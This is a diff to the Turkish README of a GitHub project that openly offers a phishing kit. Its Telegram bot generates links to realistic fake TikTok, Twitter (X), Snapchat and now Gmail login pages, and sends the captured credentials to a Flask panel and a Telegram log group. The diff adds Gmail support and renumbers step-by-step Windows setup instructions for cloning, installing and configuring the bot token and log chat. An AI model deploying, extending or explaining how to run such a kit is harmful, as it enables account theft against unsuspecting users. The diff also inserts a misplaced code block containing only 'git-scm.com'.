@@ -15,7 +15,7 @@ Telegram botu, kullanıcı dostu arayüzü sayesinde çeşitli sosyal medya plat
 -   **TikTok**: İkna edici TikTok giriş sayfası simülasyonu.
 -   **Twitter (X)**: Yenilenmiş ve modern Twitter (X) giriş sayfası simülasyonu.
 -   **Snapchat**: Güncellenmiş ve gerçekçi Snapchat giriş sayfası simülasyonu.
--   **Gmail**: Yakında eklenecek.
+-   **Gmail**: Gerçekçi gmail giriş sayfası simülasyonu.
 
 Bot, kullanıcıların seçimine göre dinamik olarak özel linkler oluşturur ve bu linkler üzerinden toplanan bilgileri Flask paneline iletir.
 
@@ -44,35 +44,39 @@ Windows işletim sisteminde kurulum için aşağıdaki adımları izleyin:
 
 2.  **Git Kurulumu**: Git'in resmi web sitesinden (git-scm.com) Git'i indirin ve kurun.
 
-3.  **Proje Klonlama**: Komut İstemi'ni (CMD) veya PowerShell'i açın ve aşağıdaki komutu kullanarak projeyi klonlayın:
+   ```bash
+   git-scm.com
+   ```
+
+4.  **Proje Klonlama**: Komut İstemi'ni (CMD) veya PowerShell'i açın ve aşağıdaki komutu kullanarak projeyi klonlayın:
 
     ```bash
     git clone https://github.com/king0din/tgkingphiser.git
     cd tgkingphiser
     ```
 
-4.  **Sanal Ortam Oluşturma (Önerilen)**: Proje bağımlılıklarını izole etmek için bir sanal ortam oluşturun ve etkinleştirin:
+5.  **Sanal Ortam Oluşturma (Önerilen)**: Proje bağımlılıklarını izole etmek için bir sanal ortam oluşturun ve etkinleştirin:
 
     ```bash
     python -m venv venv
     .\venv\Scripts\activate
     ```
 
-5.  **Bağımlılıkları Yükleme**: `requirements.txt` dosyasında belirtilen tüm Python kütüphanelerini yükleyin:
+6.  **Bağımlılıkları Yükleme**: `requirements.txt` dosyasında belirtilen tüm Python kütüphanelerini yükleyin:
 
     ```bash
     pip install -r requirements.txt
     ```
 
-6.  **Telegram Bot Tokenı ve Log Grup ID'si Ayarlama**:
+7.  **Telegram Bot Tokenı ve Log Grup ID'si Ayarlama**:
     -   Telegram'da [BotFather](https://t.me/BotFather) ile yeni bir bot oluşturun ve size verilen bot token'ı kaydedin.
     -   Log bilgilerini göndermek istediğiniz Telegram grubunun sohbet ID'sini (Chat ID) alın. Bunun için botunuzu gruba ekleyip bir mesaj gönderdikten sonra `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` adresine giderek `chat.id` değerini bulabilirsiniz.
 
-7.  **Yapılandırma Dosyalarını Düzenleme**:
+8.  **Yapılandırma Dosyalarını Düzenleme**:
     -   `telegram_bot.py` dosyasını bir metin düzenleyici ile açın ve `BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'` kısmını kendi bot token'ınızla değiştirin.
     -   `flask_app.py` dosyasını açın ve `TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'` ile `LOG_GROUP_CHAT_ID = 'YOUR_LOG_GROUP_CHAT_ID_HERE'` kısımlarını kendi token ve ID bilgilerinizle güncelleyin.
 
-8.  **Uygulamaları Çalıştırma**:
+9.  **Uygulamaları Çalıştırma**:
     -   Flask uygulamasını başlatın:
 
         ```bash
